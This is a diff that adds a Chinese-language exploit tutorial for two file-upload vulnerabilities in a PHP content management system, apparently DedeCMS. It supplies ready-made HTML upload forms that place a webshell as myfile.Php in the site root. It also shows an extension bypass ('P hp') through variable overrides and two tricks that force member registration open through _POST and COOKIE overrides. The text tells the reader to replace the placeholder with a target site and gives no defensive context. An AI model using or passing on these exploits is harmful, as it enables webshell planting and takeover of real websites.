@@ -1,0 +1,20 @@
+上传漏洞1：
+ 漏洞原理：
+ /plus/carbuyaction.php?dopost=memclickout&amp;oid =S-P0RN8888&amp;rs[code]=../dialog/select_soft_post
+ 这样就包含了dialog/select_soft_post
+ 要求网站开启新会员注册功能，首先注册新会员，登陆会员中心，选择记住密码或者记住登录，不要关闭浏览器最好拉，因为下面的exp要保持在登录状态下。把马儿提前重命名为1.rar。
+ 
+<form action="http://www.3hack.com.com/plus/carbuyaction.php?dopost=memclickout&amp;oid=S-P0RN8888&amp;rs[code]=../dialog/select_soft_post" method="post" name="form1" enctype="multipart/form-data">file:<input type="file" name="uploadfile" />
+ newname:<input type="text" name="newname" value="myfile.Php" /><button type="submit">提交</button>
+ 
+修改www.3hack.com 为你的目标站点，保存上面代码为1.html
+ 
+选择上传1.rar即可。提交后尽管页面出错，myfile.Php文件会成功上传到网站根目录、
+ 
+上传漏洞2：
+ 
+</form><form action="http://127.1/member/uploads_add.php" method="post" name="form1" enctype="multipart/form-data"><input type="hidden" name="mediatype" value="4" /> <input type="hidden" name="_GET[cfg_mb_addontype]" value="P hp|Php|php" /> <input type="hidden" name="dopost" value="save" /> <input id="addonfile" type="file" name="addonfile" /><button type="submit">提交</button></form>保存为2.html。将待上传的Php文件扩展名改为“P hp” 有个空格，然后利用该页面完成上传，从地址栏得到新文件名。
+ 
+如果网站禁止新会员注册怎么办？
+ 有两个方法可以突破：
+ 方法一：修改注册提交页面源码，将form的action值改为“http://127.1/member/reg_new.php?_POST[cfg_mb_allowreg]=Y”，其中“127.1”根据实际修改。 方法二：修改注册提交页面源码，在form中增加“input”元素，name属性为“COOKIE[cfgmballowreg]”，值为“Y”（非“N”）。
